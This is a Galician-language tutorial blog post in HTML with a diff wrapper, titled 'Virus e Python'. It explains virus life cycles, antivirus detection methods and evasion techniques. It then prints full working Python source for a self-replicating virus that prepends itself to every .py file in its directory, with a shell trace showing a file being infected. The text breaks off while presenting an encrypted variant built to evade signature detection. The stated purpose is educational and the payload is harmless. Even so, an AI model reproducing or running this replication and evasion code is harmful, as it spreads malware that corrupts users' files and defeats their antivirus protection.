@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+<html lang="gl" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Virus e Python - Hackliza</title>
+  <meta name="description" content="Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas para detectar un virus. Despois, comentaranse as principais técnicas anti-antivirus. Logo, explicarase como funciona un virus aportando exemplos de código, para finalmente, engadir varias melloras e proteccións para que non se poida detectar mediante sinatura.
+Advertencia: a finalidade desta publicación é educativa."><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Hackliza",
+    
+    "url": "https:\/\/hackliza.gal\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/hackliza.gal\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/hackliza.gal\/posts\/virus_python\/",
+          "name": "Virus e python"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "Guzmán Cernadas Pérez"
+  },
+  "headline": "Virus e Python",
+  "description" : "Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas para detectar un virus. Despois, comentaranse as principais técnicas anti-antivirus. Logo, explicarase como funciona un virus aportando exemplos de código, para finalmente, engadir varias melloras e proteccións para que non se poida detectar mediante sinatura.\nAdvertencia: a finalidade desta publicación é educativa.",
+  "inLanguage" : "gl",
+  "wordCount":  4951 ,
+  "datePublished" : "2020-12-14T00:00:00",
+  "dateModified" : "2020-12-14T00:00:00",
+  "image" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+  "keywords" : [ "python, malware, obfuscation" ],
+  "mainEntityOfPage" : "https:\/\/hackliza.gal\/posts\/virus_python\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/hackliza.gal\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/hackliza.gal\/img\/hackliza.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="Virus e Python" />
+<meta property="og:description" content="Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas para detectar un virus. Despois, comentaranse as principais técnicas anti-antivirus. Logo, explicarase como funciona un virus aportando exemplos de código, para finalmente, engadir varias melloras e proteccións para que non se poida detectar mediante sinatura.
+Advertencia: a finalidade desta publicación é educativa.">
+<meta property="og:image" content="https://hackliza.gal/img/hackliza.png" />
+<meta property="og:url" content="https://hackliza.gal/posts/virus_python/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Hackliza" />
+
+  <meta name="twitter:title" content="Virus e Python" />
+  <meta name="twitter:description" content="Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas …">
+  <meta name="twitter:image" content="https://hackliza.gal/img/hackliza.png" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:site" content="@hackliza" />
+  <meta name="twitter:creator" content="@hackliza" />
+  <link href='https://hackliza.gal/img/hackliza.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.74.3" />
+  <link rel="alternate" href="https://hackliza.gal/index.xml" type="application/rss+xml" title="Hackliza"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://hackliza.gal/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://hackliza.gal/css/syntax.css" /><link rel="stylesheet" href="https://hackliza.gal/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><style>
+ nav {
+     background: #0099CC !important;
+ }
+
+ .navbar-brand, #main-navbar ul li a, footer {
+     color: #fff !important;
+ }
+
+ .navbar-brand:hover, #main-navbar ul li a:hover {
+     color: #ccc !important;
+ }
+
+
+ figure {
+     margin-top: 1.5em; 
+     margin-bottom: 1.5em; 
+ }
+ 
+ figcaption {
+     text-align: center;
+     font-size: 85%;
+ }
+
+ pre {
+     overflow-x: auto !important;
+ }
+
+ .posts-heading {
+     text-align: center;
+ }
+ 
+</style>
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Conmuta navegación</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://hackliza.gal/">Hackliza</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blogue" href="/">Blogue</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Sobre nós" href="/about/">Sobre nós</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Charlas" href="/talks/">Charlas</a>
+            </li>
+          
+        
+
+        
+          
+            <li>
+              
+                
+                  <a href="/en" lang="en">en</a>
+                
+              
+                
+              
+            </li>
+          
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Hackliza" href="https://hackliza.gal/">
+            <img class="avatar-img" src="https://hackliza.gal/img/hackliza.png" alt="Hackliza" />
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="posts-heading">
+              
+                <h1>Virus e Python</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <p>Nesta publicación explicarase varias cuestións a hora de entender como funciona un virus. Primeiro explicaranse que son 
+e como é o seu ciclo de vida. A continuación, esbozaranse as principais técnicas para detectar un virus. Despois, 
+comentaranse as principais técnicas anti-antivirus. Logo, explicarase como funciona un virus aportando exemplos de 
+código, para finalmente, engadir varias melloras e proteccións para que non se poida detectar mediante sinatura.</p>
+<p>Advertencia: a finalidade desta publicación é educativa. En ningún caso os membros de Hackliza se farán responsables do 
+que se faga con este código.</p>
+<h1 id="que-é-un-virus">Que é un virus?</h1>
+<p>Un virus é un programa capaz de copiarse a si mesmo a outros arquivos.</p>
+<p>O ciclo de vida dun virus, normalmente, consta de tres fases:</p>
+<ul>
+<li>Infección: nesta fase o virus espallase polo sistema, buscando posibles ficheiros para reproducirse e finalmente 
+copiarse. Existen dous tipos de infección:
+<ul>
+<li>Pasiva: o usuario dun sistema copia o virus dalgún lado e execútao.</li>
+<li>Activa: o virus explota algunha vulnerabilidade para infectar o sistema.</li>
+</ul>
+</li>
+<li>Incubación: nesta fase o virus busca manterse no sistema o maior tempo posible.</li>
+<li>Enfermidade: nesta fase é cando se realizan as accións non desexadas polo usuario.</li>
+</ul>
+<h1 id="como-se-detecta-un-virus">Como se detecta un virus?</h1>
+<p>Á hora de detectar un virus, utilízanse varias técnicas:</p>
+<p><strong>Técnicas estáticas</strong>. Estas técnicas examinan os arquivos infectados ou orixinais sen executar o código. Algúns 
+exemplos destas técnicas son:</p>
+<ul>
+<li>Busca de sinaturas víricas: consiste en crear unha firma dunha característica propia do virus e buscala. A 
+característica pode ser unha cadea de caracteres, unha secuencia de instrucións ou unha marca usada polo mecanismo de 
+detección do virus.</li>
+<li>Análise espectral: consiste en buscar instrucións sospeitosas utilizadas por outro software malicioso. Por exemplo, 
+unha instrución sospeitosa sería “a = a + 0”, a cal non modifica o comportamento do virus, pero pode ser utilizada 
+para modificar a sinatura deste.</li>
+<li>Análise heurístico: consiste en analizar o comportamento dun programa, para detectar posibles accións maliciosas.</li>
+</ul>
+<p><strong>Técnicas dinámicas</strong>. Estas técnicas executan o código sospeitoso e deciden se é un malware ou non en base ao 
+comportamento observado. Algunhas destas técnicas son:</p>
+<ul>
+<li>Seguimento de comportamentos: o antivirus residente en memoria, intentará detectar calquera actividade sospeitosa e 
+parala. Para observar o comportamento dun programa en Linux, o antivirus fará un seguimento das chamadas realizadas 
+as interrupcións 13H e 21H. Para Windows, farase un seguimento das chamadas realizadas á API do sistema operativo.</li>
+<li>Emulación de código (Sandboxing): o programa sospeitoso é executado nun sistema emulado para ver o seu comportamento.</li>
+</ul>
+<p><strong>Comprobación da integridade dos arquivos</strong>. Nesta técnica comprobase se se modificou un arquivo comprobando o hash 
+cada certo tempo.</p>
+<h1 id="técnicas-anti-antivirus">Técnicas anti-antivirus</h1>
+<p>Este tipo de técnicas empréganse para evitar que un antivirus detecte un código malicioso. Algunhas delas son:</p>
+<p><strong>Técnicas de sixilo</strong>: son un conxunto de técnicas cuxo obxectivo é convencer ao usuario de que non está pasando nada 
+malo. Algún exemplo destas técnicas son:</p>
+<ul>
+<li>Hooking de interrupcións ou chamadas realizadas á API de Windows.</li>
+<li>Borrar o seu propio executable.</li>
+<li>Detección dunha sandbox para non executarse.</li>
+</ul>
+<p><strong>Polimorfismo</strong>: son técnicas encamiñadas a evitar a detección por sinatura. Este tipo de técnicas fan que se 
+reescriba o código do programa (neste tipo de modificacións non se cambia o comportamento do virus, se non que se 
+engaden instrucións lixo coma por exemplo, NOP ou add eax, 0) ou que se cifren partes deste.</p>
+<p><strong>Metamorfismo</strong>: son técnicas encamiñadas a evitar a detección por sinatura e a detección por comportamento. Este tipo 
+de técnicas fan que se reescriba o código do programa cambiando as súas funcionalidades. Algunhas técnicas de 
+metamorfismo son:</p>
+<ul>
+<li>Dividir unha instrución en dúas ou máis.</li>
+<li>Converter dúas instrucións nunha soa.</li>
+<li>Adición de código morto.</li>
+</ul>
+<p><strong>Outras técnicas máis intrusivas</strong> son: matar o proceso do antivirus, desinstalar o antivirus ou corromper a base de 
+datos de sinaturas do antivirus.</p>
+<h1 id="creación-e-funcionamento-dun-virus">Creación e funcionamento dun virus</h1>
+<p>Para ensinar como funciona un virus utilizarase Python coma linguaxe de programación. Esta linguaxe foi escollida pola 
+pouca complexidade que se ten á hora de crear e ler código.</p>
+<p>Nota: ningún dos virus ensinados nesta publicación conterá unha función maliciosa con fin de evitar estragos. Tamén hai 
+que destacar que en todas as funcións de infección presentadas só se contempla o directorio dende onde se executa o 
+virus.</p>
+<h2 id="creando-un-virus">Creando un virus</h2>
+<p>O virus que se presenta a continuación terá a funcionalidades de autoreplicarse e mostrar pola pantalla unha mensaxe 
+cando se termina o proceso de infección. Outra característica é que o virus escríbese no principio de cada arquivo 
+infectado, facendo que, se se executa un arquivo que conteña o virus, se execute o código malicioso antes ca o código 
+lexítimo.</p>
+<p>Sen máis preámbulos disponse a explicar que fan cada unha das partes do virus:</p>
+<ul>
+<li>Función <strong>infectar</strong>: esta función busca posibles arquivos para infectar no cartafol onde se executa o virus. Unha 
+vez atopado un candidato, comproba se xa está infectado previamente. Se non o está, crearase un novo ficheiro que 
+conterá o virus e o código do candidato.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    ruta <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(ruta):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            script<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span> <span style="color:#f92672">in</span> texto_script:
+                infectado <span style="color:#f92672">=</span> open(arquivo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infectado&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+                infectado<span style="color:#f92672">.</span>write(virus <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+                infectado<span style="color:#f92672">.</span>write(texto_script)
+                infectado<span style="color:#f92672">.</span>close()
+                os<span style="color:#f92672">.</span>remove(arquivo)
+                os<span style="color:#f92672">.</span>rename(arquivo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infectado&#34;</span>, arquivo)
+</code></pre></div><ul>
+<li>Función <strong>payload</strong>: esta función contería o código malicioso. Neste caso só imprime pola pantalla a mensaxe 
+“Fuches infectado”.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuches infectado&#34;</span>)
+</code></pre></div><ul>
+<li>Función <strong>executa</strong>: esta función chama as funcións de infectar e payload.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executa</span>(virus):
+    infectar(virus)
+    payload()
+</code></pre></div><ul>
+<li><strong>Código global</strong>: Este código lee o arquivo que se está a executar, extrae o código do virus e chama á función 
+executa.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> texto_portador[texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span>):texto_portador<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;# Virus:Fin&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;# Virus:Fin&#34;</span>)]
+executa(virus)
+</code></pre></div><p>O código do virus atópase situado entre dous comentarios: #Virus:Inicio e #Virus:Fin. Con estes comentarios pretendese 
+coñecer a localización do código vírico en calquera arquivo (tanto os infectados coma o orixinal).</p>
+<p>Unha vez explicadas polo miúdo as funcións do virus, o código final deste é o seguinte:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Virus:Inicio</span>
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> sys
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">infectar</span>(virus):
+    ruta <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> arquivo <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(ruta):
+        <span style="color:#66d9ef">if</span> arquivo<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">&#34;.py&#34;</span>):
+            script <span style="color:#f92672">=</span> open(arquivo, <span style="color:#e6db74">&#34;r&#34;</span>)
+            texto_script <span style="color:#f92672">=</span> script<span style="color:#f92672">.</span>read()
+            script<span style="color:#f92672">.</span>close()
+            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span> <span style="color:#f92672">in</span> texto_script:
+                infectado <span style="color:#f92672">=</span> open(arquivo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infectado&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>)
+                infectado<span style="color:#f92672">.</span>write(virus <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+                infectado<span style="color:#f92672">.</span>write(texto_script)
+                infectado<span style="color:#f92672">.</span>close()
+                os<span style="color:#f92672">.</span>remove(arquivo)
+                os<span style="color:#f92672">.</span>rename(arquivo <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.infectado&#34;</span>, arquivo)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">payload</span>():
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Fuches infectado&#34;</span>)
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">executa</span>(virus):
+    infectar(virus)
+    payload()
+
+
+portador <span style="color:#f92672">=</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#34;r&#34;</span>)
+texto_portador <span style="color:#f92672">=</span> portador<span style="color:#f92672">.</span>read()
+portador<span style="color:#f92672">.</span>close()
+virus <span style="color:#f92672">=</span> texto_portador[texto_portador<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span>):texto_portador<span style="color:#f92672">.</span>rfind(<span style="color:#e6db74">&#34;# Virus:Fin&#34;</span>) <span style="color:#f92672">+</span> len(<span style="color:#e6db74">&#34;# Virus:Fin&#34;</span>)]
+executa(virus)
+<span style="color:#75715e"># Virus:Fin</span>
+</code></pre></div><p>Se se executa este código nun cartafol con outros ficheiros coa extensión .py, obterase o seguinte resultado:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">probasvx@probasvx:~/virus1$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:12 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:05 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx   <span style="color:#ae81ff">20</span> Dec <span style="color:#ae81ff">14</span> 11:12 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">925</span> Dec <span style="color:#ae81ff">14</span> 11:11 virus.py
+probasvx@probasvx:~/virus1$ cat Ola.py 
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola mundo!&#34;</span><span style="color:#f92672">)</span>
+probasvx@probasvx:~/virus1$ python3 virus.py 
+Fuches infectado
+probasvx@probasvx:~/virus1$ ls -las
+total <span style="color:#ae81ff">16</span>
+<span style="color:#ae81ff">4</span> drwxr-xr-x  <span style="color:#ae81ff">2</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:12 .
+<span style="color:#ae81ff">4</span> drwxr-xr-x <span style="color:#ae81ff">23</span> probasvx probasvx <span style="color:#ae81ff">4096</span> Dec <span style="color:#ae81ff">14</span> 11:05 ..
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">945</span> Dec <span style="color:#ae81ff">14</span> 11:12 Ola.py
+<span style="color:#ae81ff">4</span> -rw-r--r--  <span style="color:#ae81ff">1</span> probasvx probasvx  <span style="color:#ae81ff">925</span> Dec <span style="color:#ae81ff">14</span> 11:11 virus.py
+probasvx@probasvx:~/virus1$ cat Ola.py 
+<span style="color:#75715e"># Virus:Inicio</span>
+import os
+import sys
+
+
+def infectar<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>:
+    ruta <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.&#34;</span>
+    <span style="color:#66d9ef">for</span> arquivo in os.listdir<span style="color:#f92672">(</span>ruta<span style="color:#f92672">)</span>:
+        <span style="color:#66d9ef">if</span> arquivo.endswith<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;.py&#34;</span><span style="color:#f92672">)</span>:
+            script <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>arquivo, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>
+            texto_script <span style="color:#f92672">=</span> script.read<span style="color:#f92672">()</span>
+            script.close<span style="color:#f92672">()</span>
+            <span style="color:#66d9ef">if</span> not <span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span> in texto_script:
+                infectado <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>arquivo + <span style="color:#e6db74">&#34;.infectado&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span>
+                infectado.write<span style="color:#f92672">(</span>virus + <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span>
+                infectado.write<span style="color:#f92672">(</span>texto_script<span style="color:#f92672">)</span>
+                infectado.close<span style="color:#f92672">()</span>
+                os.remove<span style="color:#f92672">(</span>arquivo<span style="color:#f92672">)</span>
+                os.rename<span style="color:#f92672">(</span>arquivo + <span style="color:#e6db74">&#34;.infectado&#34;</span>, arquivo<span style="color:#f92672">)</span>
+
+
+def payload<span style="color:#f92672">()</span>:
+    print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Fuches infectado&#34;</span><span style="color:#f92672">)</span>
+
+
+def executa<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>:
+    infectar<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>
+    payload<span style="color:#f92672">()</span>
+
+
+portador <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span>sys.argv<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>
+texto_portador <span style="color:#f92672">=</span> portador.read<span style="color:#f92672">()</span>
+portador.close<span style="color:#f92672">()</span>
+virus <span style="color:#f92672">=</span> texto_portador<span style="color:#f92672">[</span>texto_portador.find<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:Inicio&#34;</span><span style="color:#f92672">)</span>:texto_portador.rfind<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:Fin&#34;</span><span style="color:#f92672">)</span> + len<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;# Virus:Fin&#34;</span><span style="color:#f92672">)]</span>
+executa<span style="color:#f92672">(</span>virus<span style="color:#f92672">)</span>
+<span style="color:#75715e"># Virus:Fin</span>
+print<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Ola mundo!&#34;</span><span style="color:#f92672">)</span>
+</code></pre></div><p>Nesta traza pódese ver como despois da execución do virus, o arquivo Ola.py aumentou de tamaño, xa que agora contén o 
+código do virus.</p>
+<p>A principal debilidade deste virus é que o código está contido entre os comentarios “#Virus:Inicio” e “#Virus:Fin”. Con 
+este dato un antivirus é capaz de detectar e eliminar o código de forma trivial. Por outro lado, coma o código é sempre 
+o mesmo, pódese utilizar como firma do virus para a detección.</p>
+<h2 id="corrixindo-debilidades">Corrixindo debilidades</h2>
+<p>En vista das debilidades que ten o virus anterior, a continuación engadirase unha protección a cal será cifrar o código 
+para que, por un lado o cifrado sexa diferente despois de cada infección (e polo tanto a firma do código tamén) e por 
+outro para que aos analistas lles sexa máis complicado saber que fai o código. Outra cousa que cambia é que neste virus 
+deixarase de utilizar os comentarios “#Virus:Inicio” e “#Virus:Fin” xa que son unha evidencia do propio virus. Por 
+último, os arquivos infectados terán o código do virus ao final en vez de ao principio.</p>
+<p>O malware que se presenta a continuación será un <strong>xerme</strong>, isto é un programa en texto claro que xerará un virus 
+(neste caso cunha parte cifrada). Este xerme conterá unha función para cifrar e outra para descifrar o código, tamén 
+contará cunha función para o cálculo da clave coa que se cifran os datos.</p>
+<p>As diferentes partes do xerme que se creará son as seguintes:</p>
+<ul>
+<li>Función <strong>calcula_clave</strong>: esta función calcula a clave de cifrado a partir das primeiras letras dun arquivo. En caso 
+de que o arquivo conteña menos de 3 letras a clave devolta é 42.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">calcula_clave</span>(texto):
+    <span style="color:#66d9ef">if</span> len(texto) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
+        clave <span style="color:#f92672">=</span> ord(texto[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> ord(texto[<span style="color:#ae81ff">2</span>])
+    <span style="color:#66d9ef">else</span>:
+        clave <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
+    <span style="color:#66d9ef">return</span> clave
+</code></pre></div><ul>
+<li>Función <strong>descifra</strong>: esta función descifra un texto cifrado co cifrado Cesar.</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">descifra</span>(texto, clave):
+    texto_descifrado <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> caracter <span style="color:#f92672">in</span> texto:
+        <span style="color:#66d9ef">if</span> caracter<span style="color:#f92672">.</span>isupper():
